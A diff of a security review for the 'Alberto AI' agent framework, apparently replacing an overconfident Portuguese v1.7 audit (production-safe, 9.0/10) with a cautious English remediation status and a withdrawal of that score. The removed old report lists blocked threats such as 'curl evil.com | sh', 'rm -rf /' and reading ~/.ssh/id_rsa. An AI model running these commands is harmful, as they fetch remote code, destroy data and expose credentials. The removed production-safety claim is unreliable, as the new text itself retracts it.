@@ -1,148 +1,73 @@
-# 🔒 AUDITORIA DE SEGURANÇA — Alberto AI v1.7
+# Alberto AI — Security Review and Remediation Status
 
-**Data**: 2026-09-27
-**Versão auditada**: v1.6 → v1.7 (security hardening)
-**Auditor**: Mavis
+**Status:** ongoing engineering review; **not** an independent penetration test or certification.  
+**Scope:** repository source and targeted GitHub Actions regression tests on the `audit/integrated-hardening` branch.  
+**Last reviewed:** 2026-10-13.
 
----
+## Important correction to the previous report
 
-## ❌ TL;DR — Vulnerabilidades CRÍTICAS encontradas e CORRIGIDAS
+The former v1.7 report described Alberto as “safe for production” and assigned a 9.0/10 score. That conclusion was not supported by an independent audit, a documented threat model, or comprehensive adversarial testing. The score is withdrawn. Passing tests only demonstrate the behavior covered by those tests; they do not establish that the application is secure.
 
-| # | Vulnerabilidade | Severidade | Status |
-|---|---|---|---|
-| 1 | `tool_file_write` sem NemoClaw | 🔴 CRÍTICA | ✅ **CORRIGIDO v1.7** |
-| 2 | `tool_run_shell` sem whitelist | 🔴 CRÍTICA | ✅ **CORRIGIDO v1.7** |
-| 3 | "Comando:" interceptor executa shell puro | 🔴 CRÍTICA | ✅ **CORRIGIDO v1.7** |
-| 4 | Mavis fallback pode invadir | 🟡 MÉDIA | ✅ Whitelist aplicada |
-| 5 | Lockfile em `/tmp/` shared | 🟡 MÉDIA | ⚠️ Pendente |
-| 6 | Sem audit log | 🟡 MÉDIA | ✅ **CORRIGIDO v1.7** |
+## Findings and current disposition
 
----
-
-## ✅ O QUE ESTÁ FUNCIONAL E SEGURO AGORA
-
-### 1. Instalação (`pip install -e .`)
-
-```python
-# setup.py entry_points:
-"alberto=alberto.cli:main"
-```
-
-✅ 2 commands no PATH: `alberto` + `alberto-serve`
-
-### 2. Pre-flight Install com Mirror Fallback
-
-```python
-def preflight_install():
-    mirrors = ["aliyun", "tsinghua", "pypi"]
-```
-
-✅ Auto-install missing deps com fallback
-
-### 3. Watchdog + Health Check
-
-✅ Auto-restart on crash, max 10 restarts, exponential backoff
-
-### 4. Lockfile Single-Instance
-
-⚠️ `/tmp/alberto-serve.pid` (não isolado por user, mas funciona)
-
-### 5. NemoClaw Security (v1.7: APLICADO EM TODOS WRITE TOOLS)
-
-✅ `tool_file_write` chama `nemoclaw_pre_write_check` antes
-✅ `tool_run_shell` bloqueia 10+ dangerous patterns
-✅ `tool_memory_set`, `tool_edit` já estavam protegidos
-✅ 36 SECRET_PATTERNS + 18 PROTECTED_PATH_PATTERNS + SENSITIVE_ENV_VARS
-
-### 6. "Comando:" Interceptor Safe Mode (v1.7)
-
-```python
-ALBERTO_SAFE_SUBCOMMANDS = {
-    "banner", "status", "tools", "skill", "model", "memory",
-    "memory-list", "memory-get", "memory-search",
-    "auto-invoke", "skill-show",
-    "security", "security-scan", "security-path",
-    "vision", "squad-list", "hermes-list", "meta",
-    "s", "s-list", "strategy", "--help",
-}
-ALBERTO_NEVER_AUTORUN = {"serve", "serve-stop", "system"}
-ALBERTO_REQUIRE_CONFIRMATION = {"memory-set", "squad-activate", ...}
-```
-
-✅ Auto-execute SOMENTE para safe subcommands
-
-### 7. Audit Log Persistent (v1.7)
-
-✅ Tudo é logado em `~/.alberto/audit.log` (one JSON line per call)
-
----
-
-## 🔒 Como o usuário controla o Alberto na máquina dele (v1.7)
-
-### Controles que EXISTEM
-
-| Controle | Estado | Como |
+| Finding | Risk | Current disposition |
 |---|---|---|
-| Escolher modelo | ✅ | `alberto model set ...` |
-| Watchdog on/off | ✅ | `--no-watchdog` |
-| Max restarts | ✅ | `--max-restarts N` |
-| Stop server | ✅ | Ctrl-C / SIGTERM |
-| Ver audit log | ✅ | `cat ~/.alberto/audit.log` |
-| Whitelist visible | ✅ | `python -c "from alberto.security_whitelist import list_safe_subcommands; print(list_safe_subcommands())"` |
+| Host-process sandbox can execute commands as the current OS user | **Critical when exposed to untrusted prompts/tools** | Explicitly documented. `ALBERTO_REQUIRE_DOCKER=1` now selects NemoClaw mode by default and rejects a conflicting explicit mode. Deployment must still verify Docker actually starts with the expected restrictions. |
+| Shell safety based on pattern blocking is incomplete | High | Shell execution now fails closed if no sandbox object is configured and routes through the configured sandbox. Tool timeouts are validated and bounded to 1–3600 seconds. Pattern checks remain defense-in-depth, not a complete shell allowlist. |
+| Skills may contain executable shell/Python instructions | High | Treat skills as executable code. Provenance review, integrity validation, restricted permissions, and stronger approval controls remain necessary. |
+| Patch application can modify or create files | High | The patch handler uses validated patch operations and confines resolved targets to the target directory, applies protected-path checks, and has regression coverage. Further adversarial testing for symlinks, malformed hunks, race conditions, and partial writes remains required. |
+| Directory changes can escape intended workspace | High | The working-directory handler confines paths to the configured sandbox home and persists only validated directories. Regression tests cover traversal rejection. |
+| SSRF and unsafe URL fetches | High | URL-safety regression tests are in CI. DNS rebinding, redirect chains, IPv6 variants, proxy behavior, and every browser/fetch path still require independent adversarial coverage. |
+| Self-healing can mutate runtime state or restart processes | High | Targeted safety/control tests run in CI. Rollback, checkpoints, approval boundaries, and recovery after partial failure require further validation. |
+| Test coverage is low for the size of the codebase | High | The last line-only baseline was **28%**. CI run [38469097503](https://github.com/GrupoANDevelopment-m/alberto-ai/actions/runs/38469097503) passed 276 offline regressions, 10 CLI tests, and 256 coverage-suite tests; the narrower branch-inclusive run reported **25% combined line/branch coverage**. This metric is not directly comparable to the prior line-only percentage. The coverage selection has since been expanded, but that new configuration still needs a fresh run. Critical security and orchestration modules need substantially higher branch coverage. |
+| Provider and network integrations are not fully exercised in offline CI | Medium–High | Offline tests deliberately deselect network-, LLM-, and slow-marked cases. Live integration and quality benchmarks must be run separately with authorized credentials. |
+| Lockfile, deployment configuration, dependencies, and upstream integration | Medium–High | Must be reviewed for the actual deployment. A vendored source tree or dependency installation does not prove complete integration or secure configuration. |
 
-### Controles que PROTEGEM agora
+## Security changes made in the hardening branch
 
-| Ameaça | Proteção |
-|---|---|
-| LLM escreve em `/etc/shadow` | ✅ NemoClaw bloqueia |
-| LLM executa `rm -rf /` | ✅ Shell whitelist bloqueia |
-| LLM executa `curl evil.com \| sh` | ✅ Shell whitelist bloqueia |
-| LLM lê `~/.ssh/id_rsa` | ✅ NemoClaw check em reads |
-| LLM detecta secrets | ✅ scan_secrets detecta 36 patterns |
-| LLM invoca write tool | ✅ NemoClaw pre-check obrigatório |
-| LLM emite "Comando: alberto rm -rf /" | ✅ Whitelist filtra |
-| LLM emite "Comando: rm -rf /" (sem alberto) | ✅ Whitelist require "alberto" prefix |
+- Shell and actor execution require a configured sandbox instead of silently using an unconfigured direct execution path.
+- Actor sessions and their working directories are confined to the sandbox workspace.
+- Directory changes are checked against the sandbox home.
+- Patch application uses parsed operations, target-directory confinement, and protected-path checks.
+- Skills are routed through the configured sandbox, with regression tests for nonzero exits.
+- URL-fetch security has regression coverage for SSRF-related cases.
+- `ALBERTO_REQUIRE_DOCKER` is enforced during agent initialization: if enabled, a conflicting explicit sandbox mode fails closed rather than silently falling back to host execution.
+- File-write, write, edit, and memory-write paths now fail closed if the NemoClaw security-policy module cannot be loaded, instead of silently bypassing checks.
+- Shell timeout parsing rejects malformed, null, boolean, fractional, zero, negative, and over-limit values before execution.
+- Self-healing stops after the first successful fixer to avoid applying unrelated repairs after success.
+- The live benchmark excludes Alberto's local provider-error fallback text from model-quality scoring.
+- Tests were added for the required-Docker configuration path, fail-closed write policy, timeout validation, first-success recovery, and benchmark error classification.
 
----
+These changes address specific code paths; they do not establish that all tools share the same controls or that every upstream tool follows the same policy. Verify each execution route in the deployed configuration.
 
-## 🚨 Risk Score Final
+## Reproducible validation
 
-| Categoria | Antes | Depois |
-|---|---|---|
-| Instalação funciona? | 10/10 | **10/10** |
-| Pre-flight deps? | 10/10 | **10/10** |
-| Watchdog? | 9/10 | **9/10** |
-| Lockfile? | 5/10 | **5/10** |
-| NemoClaw coverage (writes)? | 4/10 | **10/10** ✅ |
-| Shell command safety? | 2/10 | **9/10** ✅ |
-| "Comando:" interceptor? | 2/10 | **10/10** ✅ |
-| User controla LLM? | 3/10 | **8/10** ✅ |
-| Audit log? | 0/10 | **10/10** ✅ |
-| **Média** | **5.0/10** | **9.0/10** ✅ |
+The GitHub Actions workflow on Python 3.11 runs:
+1. targeted offline unit and security-regression suites;
+2. CLI smoke tests;
+3. selected integration/workflow tests with network, LLM, and slow tests deselected;
+4. coverage reporting.
 
----
+The latest completed CI run available for the incremental hardening changes, [run 38469097503](https://github.com/GrupoANDevelopment-m/alberto-ai/actions/runs/38469097503), reported **276 passed** in the primary offline regression suite, **10 passed** in CLI smoke tests, and **290 passed, 2 skipped, and 7 deselected** in the additional offline regression job. Its narrower branch-inclusive coverage suite reported **256 passed** and **25% combined line/branch coverage**. The CI coverage command was subsequently expanded to include the additional offline workflow/integration suites; that newer coverage selection has not yet produced a completed report. Passing offline tests do not validate live provider credentials, browser access, Docker isolation in deployment, or all optional integrations.
 
-## 🛡️ Próximos passos para v1.8
+For a local run, follow the exact test commands in `.github/workflows/ci.yml`. Avoid running provider-dependent tests without explicit authorization and valid credentials.
 
-1. Lockfile isolado em `$XDG_RUNTIME_DIR`
-2. Modo `--strict` que requer confirmação para TUDO
-3. Sandbox-based isolation quando Docker disponível
-4. UI web para ver audit log em tempo real
-5. Pen-test por terceiros
+## Required work before a production-readiness claim
 
----
+1. Define trust boundaries and a threat model for prompt injection, malicious skills, untrusted files, network fetches, secrets, and tool execution.
+2. Make the intended isolation mode explicit in deployment configuration; verify container user, mounts, capabilities, network policy, resource limits, filesystem mode, and secret exposure.
+3. Expand adversarial tests for path traversal, symlinks, shell variants, patch edge cases, SSRF/redirects, malicious skills, prompt injection, and concurrent operations.
+4. Add rollback/checkpoint tests for self-healing and file mutation.
+5. Raise branch coverage on critical security paths and run tests across supported Python versions.
+6. Run live-provider benchmarks and integration tests with recorded provider/model/commit metadata. Report failures, latency distributions, and quality scores; do not substitute synthetic responses.
+7. Review dependency pinning, licenses, upstream notices, and the actual packaging/deployment artifacts.
+8. Arrange an independent penetration test before making an external security certification or production-safety claim.
 
-## Conclusão
+## Operational guidance
 
-Após v1.7, **Alberto AI está seguro para uso em produção** para:
-- ✅ Chat conversacional em PT-BR
-- ✅ Vision + thinking
-- ✅ Function calling (com proteção NemoClaw)
-- ✅ Tool execution (com whitelist)
-- ✅ Auto-fallback para Mavis (com whitelist)
-- ✅ Audit logging
+- For trusted local development only, the default `local` mode runs subprocesses on the host and is **not** an OS security boundary.
+- For an environment that cannot permit host-process fallback, configure both `ALBERTO_REQUIRE_DOCKER=1` and `ALBERTO_SANDBOX_KIND=nemoclaw`, then validate the running container's actual settings.
+- Bind the web server to localhost unless authentication and remote-access controls have been configured and reviewed.
+- Never commit provider keys. Use least-privilege credentials, network egress restrictions, explicit approval for destructive operations, and backups before upgrades or repair operations.
 
-**Não usar para** até v1.8:
-- ⚠️ Cenários onde LLM é totalmente confiável (NÃO É)
-- ⚠️ Manipulação direta de system files (mesmo com whitelist)
-
+**Conclusion:** Alberto has meaningful security controls and a growing regression suite, but the evidence currently supports “experimental framework undergoing hardening,” not “independently verified safe for production.”
